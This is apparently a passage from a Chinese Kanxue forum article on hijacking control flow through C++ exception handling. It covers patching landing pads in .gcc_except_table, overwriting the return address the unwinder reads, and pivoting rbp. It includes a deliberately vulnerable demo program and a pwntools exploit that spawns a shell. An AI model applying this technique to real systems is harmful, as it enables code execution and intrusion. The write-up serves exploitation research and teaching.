当发生异常进行栈展开时，会根据CFI模拟栈展开的过程，但是程序并不会直接执行这些指令，而且CFI对函数调用以及跳转执行这样的指令支持有限，再加上.eh_frame在运行阶段是只读状态，因此想要修改CFI信息，完成对程序执行流的控制是比较困难的。  
  
  
CFA提供了非常强大的功能，可以被看作是一种指令集，尽管它不算特别强大，那么CFA有没有可能在其他地方被更灵活的使用呢？  
  
  
关于利用DWARF信息干坏事的事情，或许可以从katana项目中获取一些经验。  
  
  
```
https://katana.nongnu.org/
https://savannah.nongnu.org/projects/katana

```  
  
###   
### 着陆垫可以吗？  
  
.gcc_except_table节中调用点表内存放着一个名为着陆垫的东西，异常发生后，在阶段二中，_Unwind_SetIP函数会根据着陆垫设置程序指针，然后__builtin_eh_return根据_Unwind_SetIP设置的指针进行跳转。  
  
  
在当前程序中，调用点表中存在这一个表项，指令对应throw std::out_of_range，着陆垫对应着一个catch语句。  
  
  
```
Position = 122UL, LandingPad = 331UL
0000000000401216 <main>
    (gdb) l *0x401216+122 -> throw std::out_of_range(...)
    (gdb) l *0x401216+331 ->  catch (...) { ... }

```  
  
  
  
在程序中，存在着一个礼物函数，该函数会直接运行Shell，因此可以尝试修改着陆垫数值，让异常处理流程跳转到运行Shell的礼物函数。  
  
  
首先我们需要计算出新着陆垫的16进制数值。  
  
  
```
landing pad
    331 -> uint to uled128 -> 0x02cb

0000000000401216 <main>
0000000000401584 <_ZL9gift_givev>
    -> call system("/bin/sh")

0x401584 - 0x401216 = 878 -> uint to uled128 -> 0x06ee
    -> new landing pad = 0x06ee

```  
  
  
  
然后修改程序的16进制文件，将.gcc_except_table中调用点表中表现存储的着陆垫数值修改成新的数值。  
  
  
当程序发生异常时，就会跳转到_ZL9gift_givev函数的位置。  
  
  
```
.gcc_except_table
    05 cb 02 07 -> 05 ee 06 07

```  
  
  
  
当运行修改好的程序时，会发现虽然程序成功跳转到_ZL9gift_givev函数的位置，但是由于rsp未与0x10对齐，所以出现了程序崩溃的情况。  
  
  
```
Program received signal SIGSEGV, Segmentation fault.
    -> <do_system+339>:      movaps %xmm0,0x50(%rsp)
    -> rsp                   0x7fffffffda98

```  
  
  
  
显然直接修改.gcc_except_table还需要面临不少困难，一是运行期间想要修改，就要.gcc_except_table所在段是可读，这一点就非常致命，二是不管是直接修改静态二进制文件，还是想方设法在运行期完成修改，都要面临程序跳转运行后出现段错误的问题，这其中很大一部分原因都是对齐导致的。  
  
### 异常处理流程的缺陷！  
  
异常处理流程有一个很明显的问题，就是只要_Unwind_RaiseException函数在调用栈上找到catch语句，后面__builtin_eh_return就会进行跳转，跳转的依据就是着陆垫，它在运行期位于一段只读内存区域，不是太方便修改。  
  
  
_Unwind_RaiseException从当前函数开始查找catch语句，当本函数无法找到catch语句时，uw_update_context会查找CFI信息中的ra return address，ra代表着返回地址，ra一般对应着c-xxx，c对应着栈底rsp。  
  
  
所以查找栈帧的过程就是一个相对可控的部分了，如果数据溢出到被调用函数保存返回地址的位置上，那么uw_update_context更新时就会在栈上找到错误的返回地址。  
  
  
```
func a
    -> throw exception
        -> find catch
            -> found -> goto catch
            -> not found -> terminate
    -> security check

```  
  
  
  
此时做这样的一个假设，如果函数的局部变量存在溢出，我们将构造了恶意地址到ra的位置上，ra所在函数中的上方指令是存在try catch结构的，那么程序的执行流程就可以被控制，调整到我们期望的地方中。  
  
  
假如设置的返回地址上方没有try catch结构，那么你会看见程序打印出下面的话，它代表程序无法找到try catch结构。  
  
  
```
terminate called after throwing an instance of xxx

```  
  
  
  
__gxx_personality_v0在无法找到try catch结构时，自动会给found_type设置成found_terminate，之后就会调用__terminate，该函数先调用handler，再调用函数abort抛出错误，让程序退出。  
  
  
```
__gxx_personality_v0
    -> found_type = found_terminate
    -> if (found_type == found_terminate)
        -> __cxa_call_terminate
            -> __terminate
                -> handler()
                -> std::abort

```  
  
  
  
一般来讲handler对应着__verbose_terminate_handler函数。  
  
  
```
#define _GLIBCXX_DEFAULT_TERM_HANDLER __gnu_cxx::__verbose_terminate_handler

__verbose_terminate_handler
    -> fputs("terminate called after throwing an instance of '", stderr)

```  
  
  
  
除了返回地址我们可以控制外，rbp也是可以被控制的（相当于可以进行栈迁移），当throw完成异常处理的跳转后，rbp会更新成缓冲区变量读取的溢出数值，当程序再次运行leave和ret指令时，就会从fake rbp上读取指令。  
  
  
```
                  | bad return address |
                  | fake rbp           |
after overflow -> | rbp                | -> after throw -> | fake rbp |
                  | data               |                   | ...      |
                  | rsp                |                   | rsp      |

after throw -> leave && ret
    -> leave -> rbp = *(fake rbp)
    -> ret   -> rip = *(rbp)

```  
  
  
  
值得注意的是，fake rbp一定要是一个可读写的有效值，因为程序内部可能会通过指令读取或写入rbp寄存器。  
  
  
```
mov xxx,yyy(%rbp) -> *(rbp+yyy)=xxx

```  
  
###   
### 必备调用的析构函数  
  
在标准C++中会更加鼓励使用析构函数执行销毁操作，而不是类似于Windows平台上自定义的finally语句或其他语言支持的finally语句。  
  
  
因此当异常发生时，如果析构函数已经被控制，那么必备调用的析构函数就会带来风险。  
  
  
  
```
```  
  
下面执行给出了程序的源代码。  
  
## 源代码  
  
从源代码中可以看到，vuln函数存在着明显的栈溢出，且溢出一定长度后会抛出异常，与此同时gift_give函数中没有被任何函数直接调用，但它会运行Shell，且在该函数的内部存在try catch结构，因此我们可以利用异常处理流程的缺陷做些坏事！  
  
  
```
#include <setjmp.h>
#include <unistd.h>
#include <iostream>

#define BUF_SIZE			0x20
#define SETJMP_RET_VAL		2333

static bool jumped;
static jmp_buf my_env;

class eh_help_info {
public:
    eh_help_info() {
        jumped = false;
        std::cout << "enter eh_help_info" << std::endl;
    }
    ~eh_help_info() {
        std::cout << "leave eh_help_info" << std::endl;

        if (jumped == false) {
            jumped = true;
            longjmp(my_env, SETJMP_RET_VAL);
        }
    }
};

static void vuln(void)
{
    ssize_t len;
    char buf[BUF_SIZE];

    len = read(STDIN_FILENO, buf, 0x100);
    if (len > BUF_SIZE) {
        throw "too big";
    }
}

int main(void)
{
    int ret;
    eh_help_info tmp;

    try {
        std::cout << "stage 1" << std::endl;

        try {
            throw std::out_of_range("i need a exception AAA");
        }
        catch (...) {
            std::cerr << "stage 1: oh no!" << std::endl;
        }

        throw std::out_of_range("i need a exception BBB");
    }
    catch (const std::runtime_error& e) {
        std::cerr << "stage 1: runtime_error " << e.what() << std::endl;
    }
    catch (const std::out_of_range& e) {
        std::cerr << "stage 1: array out of range " << e.what() << std::endl;

        ret = setjmp(my_env);
        if (ret == 0) {
            return 0;
        }
        printf("setjmp return %d\n", ret);
    }

    try {
        std::cout << "stage 2" << std::endl;

        throw std::invalid_argument("i need a exception");
    }
    catch (...) {
        std::cerr << "stage 2: receive unknow exception" << std::endl;
    }

    try {
        vuln();
    }
    catch (const std::runtime_error& e) {
        std::cerr << e.what() << std::endl;
    }

    return 0;
}

static void gift_give(void)
{
    try {
        std::cout << "stage 3: enter " << __func__ << std::endl;
    }
    catch (const char* msg) {
        std::cout << "stage 3: receive exception [" << msg << "]" << std::endl;
    }

    system("/bin/sh");
}

```  
  
##   
## exploit构造  
  
经过前面的分析，构造出下方的exploit。  
  
  
```
import sys
import time
import pwn

sys.path.append('../MyTools')
import conversion

pwn.context.clear()
pwn.context.update(
    arch = 'amd64', os = 'linux',
)

target_info = {
    'exec_path': './eh_example',
    'exec_info': None,
    'addr_len': 0x8,
    'callee_buf2stack_len': 0x30,
    'caller_stack_len': 0x38,
}

"""1. buffer after eat payload can throw2. set rbp to an RW address3. set gift address [maybe need offset to find catch]"""

target_info['exec_info'] = pwn.ELF(target_info['exec_path'])
gitf_addr = target_info['exec_info'].symbols['_ZL9gift_givev']
print('[++] gift address = {0}'.format(hex(gitf_addr)))

conn = pwn.process(target_info['exec_path'])

conn.recvuntil(b'stage 2\n')
pwn.pause()
payload = b'A' * target_info['callee_buf2stack_len']
payload += pwn.p64(0x404a00)
payload += pwn.p64(0x4016b1)
conn.send(payload)

conn.interactive()

```  
  
##   
## 成功PWN  
  
运行exploit后成功拿到Shell，完成PWN！  
  
  
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
[++] gift address = 0x40168f
[+] Starting local process './eh_example': pid 18518
[*] Switching to interactive mode
$ id
uid=1000(astaroth) gid=1000(astaroth) groups=1000(astaroth)

```  
```
```  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8E4gvpb3vgYVWnRWiamTMSjXMGiagdtH3n5zMveAxPczrZ3e9pa4Ah5XZiaGCnd2cepGwVTRYsV6Wj4w/640?wx_fmt=png&from=appmsg "")  
  
  
看雪ID：福建炒饭乡会  
  
https://bbs.kanxue.com/user-home-1000123.htm  
  
*本文为看雪论坛精华文章，由 福建炒饭乡会 原创，转载请注明来自看雪社区  
  
  
  
# 往期推荐  
  
1、[关于PAN-OS DoS(CVE-2024-3393)的研究](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458589341&idx=1&sn=c57db95a9d3d5f4d3d5993b9e4d2398e&scene=21#wechat_redirect)  
  
  
2、[某cocos2djs游戏jsc以及资源文件解密](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458589336&idx=1&sn=bb18ed6fc3311db3e80bc5435a837817&scene=21#wechat_redirect)  
  
  
3、[[SHCTF]easyLogin 出题小记](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458589327&idx=2&sn=163feb4414326003fc3f84b95ee8b8f6&scene=21#wechat_redirect)  
  
  
4、[车机OTA包解密](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458589307&idx=1&sn=f7c4f8fab0e756cd0249e052d5c9e9fe&scene=21#wechat_redirect)  
  
  
5、[浅析代码重定位技术](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458589301&idx=1&sn=f8b5a4c4740123d4431ccb68a9063f17&scene=21#wechat_redirect)  
  
  
6、[关于PAN-OS DoS(CVE-2024-3393)的研究](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458589300&idx=2&sn=e9f874ab1024ce5d7a8a2a424b891a7f&scene=21#wechat_redirect)  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8ETJe7lMGMicXT2IQtrAVWiaTZeP023pdup6Fl3NFjUsHXqDz1H7a9ztdX4YMGIuZ3PIhtOrBGNP6RQ/640?wx_fmt=gif&from=appmsg "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8ETJe7lMGMicXT2IQtrAVWiaTZeP023pdup6Fl3NFjUsHXqDz1H7a9ztdX4YMGIuZ3PIhtOrBGNP6RQ/640?wx_fmt=gif&from=appmsg "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8ETJe7lMGMicXT2IQtrAVWiaTZeP023pdup6Fl3NFjUsHXqDz1H7a9ztdX4YMGIuZ3PIhtOrBGNP6RQ/640?wx_fmt=gif&from=appmsg "")  
  
**球在看**  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8ETJe7lMGMicXT2IQtrAVWiaTzlO4aPC1aWyOkKPCc388NZ2vF8pRJDpRKgzZiarABJnic0h8tDmofPAQ/640?wx_fmt=gif&from=appmsg "")  
  
点击阅读原文查看更多  
  
